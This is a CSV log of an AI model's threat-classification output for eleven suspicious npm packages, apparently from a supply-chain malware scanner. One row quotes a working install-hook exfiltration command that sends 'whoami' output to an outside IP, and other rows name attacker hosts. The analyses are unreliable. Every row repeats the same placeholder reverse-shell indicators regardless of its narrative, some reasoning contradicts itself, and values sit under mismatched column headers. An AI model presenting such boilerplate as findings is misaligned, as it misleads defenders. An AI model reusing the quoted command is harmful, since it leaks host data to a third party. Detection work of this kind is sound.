package_name,version,timestamp,model_name,prompt_version,verdict,confidence,chain_score,is_coherent_chain,legitimacy_score,is_justified,explanation,chain_narrative,justification_reasoning,raw_response,parsed_json
@dtci/eq-ui-lib,1.9.9,malicious,2026-03-27T13:02:25.909388,flag,0.6333,MALICIOUS,0.95,0.7,The package.json scripts.preinstall command appears to be sending base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for data exfiltration.,"[""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package.json scripts.preinstall command is sending base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for legitimate purposes such as configuration manag,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package.json scripts.preinstall command appears to be sending base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.95
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package.json scripts.preinstall command is sending base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for legitimate purposes such as configuration management or system setup.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package.json scripts.preinstall command appears to be sending base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.95}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package.json scripts.preinstall command is sending base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for legitimate purposes such as configuration management or system setup.""}}"
@dydxprotocol/perpetual,1.2.2,malicious,2026-03-27T13:02:39.957940,flag,0.6467,MALICIOUS,0.97,0.7,The attack chain involves the @dydxprotocol/perpetual package downloading a script from a CircleCI server using the curl command in a pre-install hook. The script is then executed on the victim's system.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package does not have a description or README file, and the behavior is not clearly justified as false.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attack chain involves the @dydxprotocol/perpetual package downloading a script from a CircleCI server using the curl command in a pre-install hook. The script is then executed on the victim's system."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.97
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file, and the behavior is not clearly justified as false.""
  }
}
```

This JSON object represents the analysis of the attack chain. The `chain_narrative` field provides a summary of the full attack using the real package name and real IOCs. The `attack_vector` field lists the key technical indicators, real IPs, domains, commands, and API calls involved in the attack. The `chain_score` field indicates the overall risk of the attack chain, with a score of 0.7 indicating a high level of risk. The `verdict` field is set to ""MALICIOUS"" as the chain score is above the threshold for malicious behavior. The `confidence` field indicates the confidence score of the analysis, with a score of 0.97 indicating high confidence that the signal is malicious. The `legitimacy_check` field provides a justification for the verdict, with `is_justified` set to false and a reasoning field indicating that the package does not have a description or README file, and the behavior is not clearly justified as false.""","{""chain_analysis"": {""chain_narrative"": ""The attack chain involves the @dydxprotocol/perpetual package downloading a script from a CircleCI server using the curl command in a pre-install hook. The script is then executed on the victim's system."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.97}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file, and the behavior is not clearly justified as false.""}}"
@elisaid/elisaid-js-client,6.9.3,malicious,2026-03-27T13:02:48.826561,review,0.364,MALICIOUS,0.78,0.78,"The package '@elisaid/elisaid-js-client' is making network requests to 'dc.70.lc' on port 443, potentially leading to a network exfiltration attack.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@elisaid/elisaid-js-client' is making network requests to 'dc.70.lc' on port 443, potentially leading to a network exfiltration attack."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.78
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```
This JSON object represents the analysis of the attack chain. The ""chain_analysis"" field contains the narrative of the attack, the attack vector, the chain score, the verdict (which is ""MALICIOUS"" based on the chain score), and the confidence in the detection. The ""legitimacy_check"" field contains the information about whether the detected behaviors justify the verdict.","{""chain_analysis"": {""chain_narrative"": ""The package '@elisaid/elisaid-js-client' is making network requests to 'dc.70.lc' on port 443, potentially leading to a network exfiltration attack."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.78}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
@employee-experience/common,999.9.11,malicious,2026-03-27T13:02:57.070406,flag,0.77,MALICIOUS,0.82,0.77,"The package '@employee-experience/common' version 999.9.11 is executing dynamic code using the 'eval' function in the install.js file. This could potentially lead to malicious intent if the code being evaluated is not trusted. The package version also contains inflated segment(s), which could indica","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package does not have a description or README file, indicating that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@employee-experience/common' version 999.9.11 is executing dynamic code using the 'eval' function in the install.js file. This could potentially lead to malicious intent if the code being evaluated is not trusted. The package version also contains inflated segment(s), which could indicate a supply chain attack or confusion."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.77,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.82
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file, indicating that it may be malicious.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@employee-experience/common' version 999.9.11 is executing dynamic code using the 'eval' function in the install.js file. This could potentially lead to malicious intent if the code being evaluated is not trusted. The package version also contains inflated segment(s), which could indicate a supply chain attack or confusion."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.77, ""verdict"": ""MALICIOUS"", ""confidence"": 0.82}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file, indicating that it may be malicious.""}}"
@grubhubprod/cookbook,9999.9999.2,malicious,2026-03-27T13:03:07.723187,flag,1.0,MALICIOUS,0.85,0.7,"The package '@grubhubprod/cookbook' version '9999.9999.2' is making network requests to an external IP address (44.196.248.120) during the install process. This could potentially indicate network exfiltration, where sensitive data is being sent to an unauthorized location.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, and the suspicious behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@grubhubprod/cookbook' version '9999.9999.2' is making network requests to an external IP address (44.196.248.120) during the install process. This could potentially indicate network exfiltration, where sensitive data is being sent to an unauthorized location."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.85
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, and the suspicious behavior is unjustified.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_analysis' field contains the narrative of the attack, the attack vector, the chain score, the verdict, and the confidence in the verdict. The 'legitimacy_check' field contains the information about whether the behavior is justified and the reasoning behind it.","{""chain_analysis"": {""chain_narrative"": ""The package '@grubhubprod/cookbook' version '9999.9999.2' is making network requests to an external IP address (44.196.248.120) during the install process. This could potentially indicate network exfiltration, where sensitive data is being sent to an unauthorized location."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.85}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, and the suspicious behavior is unjustified.""}}"
@immersive-composer/backend-resources,10.0.0,malicious,2026-03-27T13:03:15.333168,review,0.336,MALICIOUS,0.72,0.7,"The package @immersive-composer/backend-resources contains no JavaScript files, which could indicate a potential supply chain attack. The attack vector could be a post-install hook that exfiltrates sensitive data to an IP address (34.x.x.x:4444).","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, indicating that it may not be legitimate.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package @immersive-composer/backend-resources contains no JavaScript files, which could indicate a potential supply chain attack. The attack vector could be a post-install hook that exfiltrates sensitive data to an IP address (34.x.x.x:4444)."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, indicating that it may not be legitimate.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package @immersive-composer/backend-resources contains no JavaScript files, which could indicate a potential supply chain attack. The attack vector could be a post-install hook that exfiltrates sensitive data to an IP address (34.x.x.x:4444)."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, indicating that it may not be legitimate.""}}"
@playgami/portal-logs,2.99.99,malicious,2026-03-27T13:03:29.656461,review,0.336,MALICIOUS,0.72,0.72,The package '@playgami/portal-logs' contains no JavaScript files but an install hook present. The install hook command is './pre.sh'. This suggests a potential attack chain where the attacker may have installed malware or a backdoor.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package does not contain a description or a README file, indicating that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@playgami/portal-logs' contains no JavaScript files but an install hook present. The install hook command is './pre.sh'. This suggests a potential attack chain where the attacker may have installed malware or a backdoor."",
    ""attack_vector"": [
      ""postinstallhook"",
      ""bash-c"",
      ""34.x.x.x:4444"",
      ""reverseshell""
    ],
    ""chain_score"": 0.72,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not contain a description or a README file, indicating that it may be malicious.""
  }
}
```

This JSON object represents the analysis of the package. The behavior category is 'install_hook', which indicates that the package contains no JavaScript files but an install hook present. The confidence score is 0.72, indicating high confidence that this behavior is malicious. The evidence commands include './pre.sh', which is the install hook command. The risk vector includes 'install_hook'.

The attack chain narrative suggests a potential attack chain where the attacker may have installed malware or a backdoor. The attack vector includes the key technical indicators: real IPs, domains, commands, and API calls. The example of attack vector for a reverse shell is [""postinstallhook"",""bash-c"",""34.x.x.x:4444"",""reverseshell""].

The legitimacy check verdict is 'MALICIOUS', indicating that the package is potentially malicious. The package does not contain a description or a README file, indicating that it may be malicious.""","{""chain_analysis"": {""chain_narrative"": ""The package '@playgami/portal-logs' contains no JavaScript files but an install hook present. The install hook command is './pre.sh'. This suggests a potential attack chain where the attacker may have installed malware or a backdoor."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.72, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not contain a description or a README file, indicating that it may be malicious.""}}"
@podval/test_dep_confs,1.0.0,malicious,2026-03-27T13:03:39.620519,flag,0.7773,MALICIOUS,0.83,0.78,The malicious code in the package '@podval/test_dep_confs' is attempting to exfiltrate sensitive data over the network. The malicious code is making a network request to an external IP address '34.141.82.227' during the pre-installation of the package. The evidence for this malicious intent comes fr,"[""postinstallhook"", ""bash-c"", ""34.141.82.227:4444"", ""reverseshell""]",False,"This package has no description or README file, and no suspicious behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The malicious code in the package '@podval/test_dep_confs' is attempting to exfiltrate sensitive data over the network. The malicious code is making a network request to an external IP address '34.141.82.227' during the pre-installation of the package. The evidence for this malicious intent comes from the hardcoded external IP address and the command 'curl http://34.141.82.227/?whoami=$(whoami)'."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.141.82.227:4444"", ""reverseshell""],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.83
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""This package has no description or README file, and no suspicious behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The malicious code in the package '@podval/test_dep_confs' is attempting to exfiltrate sensitive data over the network. The malicious code is making a network request to an external IP address '34.141.82.227' during the pre-installation of the package. The evidence for this malicious intent comes from the hardcoded external IP address and the command 'curl http://34.141.82.227/?whoami=$(whoami)'."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.141.82.227:4444"", ""reverseshell""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.83}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""This package has no description or README file, and no suspicious behavior is unjustified.""}}"
@realty-front/ad,1.13.1,malicious,2026-03-27T13:03:52.075383,review,0.336,MALICIOUS,0.92,0.7,The package '@realty-front/ad' version 1.13.1 contains an install hook that may execute remote code at install time. The install hook executes a curl command with a payload that may indicate a remote code execution attempt.,"[""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not contain a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@realty-front/ad' version 1.13.1 contains an install hook that may execute remote code at install time. The install hook executes a curl command with a payload that may indicate a remote code execution attempt."",
    ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.92
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not contain a description or README file.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_narrative' field provides a summary of the full attack using the real package name and real IOCs. The 'attack_vector' field lists the key technical indicators of the attack, including the command used to execute remote code. The 'chain_score' field indicates the confidence level of the attack chain, with a score of 0.7 indicating a high level of confidence. The 'verdict' field indicates whether the package is malicious, suspicious, or benign based on the chain_score. The 'confidence' field provides the confidence score of the detected behaviors. The 'legitimacy_check' field indicates whether the package is justified based on the absence of a description or README file.""","{""chain_analysis"": {""chain_narrative"": ""The package '@realty-front/ad' version 1.13.1 contains an install hook that may execute remote code at install time. The install hook executes a curl command with a payload that may indicate a remote code execution attempt."", ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.92}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not contain a description or README file.""}}"
@realty-front/payment-cards,1.13.1,malicious,2026-03-27T13:03:59.602102,review,0.336,MALICIOUS,0.72,0.7,The package '@realty-front/payment-cards' version 1.13.1 contains a suspicious behavior where an install hook is present with a payload likely to execute at install time. The payload may be remote. The attacker could potentially exfiltrate sensitive data or execute a reverse shell.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not contain any useful normal code and the signals indicate a potential malicious intent.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@realty-front/payment-cards' version 1.13.1 contains a suspicious behavior where an install hook is present with a payload likely to execute at install time. The payload may be remote. The attacker could potentially exfiltrate sensitive data or execute a reverse shell."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not contain any useful normal code and the signals indicate a potential malicious intent.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@realty-front/payment-cards' version 1.13.1 contains a suspicious behavior where an install hook is present with a payload likely to execute at install time. The payload may be remote. The attacker could potentially exfiltrate sensitive data or execute a reverse shell."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not contain any useful normal code and the signals indicate a potential malicious intent.""}}"
@roku-web-core/ajax,1.99999999999999.99999999999999,malicious,2026-03-27T13:04:09.563014,flag,0.754,MALICIOUS,0.68,0.7,"The code in the '@roku-web-core/ajax' package is making network requests to a non-standard URL ('https://jon-test.site/funtimes.php') using the 'https.get' function. The package version is '1.99999999999999.99999999999999', which is a high number. This suggests that the code may be attempting to exf","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,This package has no description or README file. Suspicious behavior is unjustified.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The code in the '@roku-web-core/ajax' package is making network requests to a non-standard URL ('https://jon-test.site/funtimes.php') using the 'https.get' function. The package version is '1.99999999999999.99999999999999', which is a high number. This suggests that the code may be attempting to exfiltrate data or perform some kind of network activity, consistent with the 'network_exfiltration' and 'versioncontainsinflatedsegment' signals."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.68
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""This package has no description or README file. Suspicious behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The code in the '@roku-web-core/ajax' package is making network requests to a non-standard URL ('https://jon-test.site/funtimes.php') using the 'https.get' function. The package version is '1.99999999999999.99999999999999', which is a high number. This suggests that the code may be attempting to exfiltrate data or perform some kind of network activity, consistent with the 'network_exfiltration' and 'versioncontainsinflatedsegment' signals."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.68}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""This package has no description or README file. Suspicious behavior is unjustified.""}}"
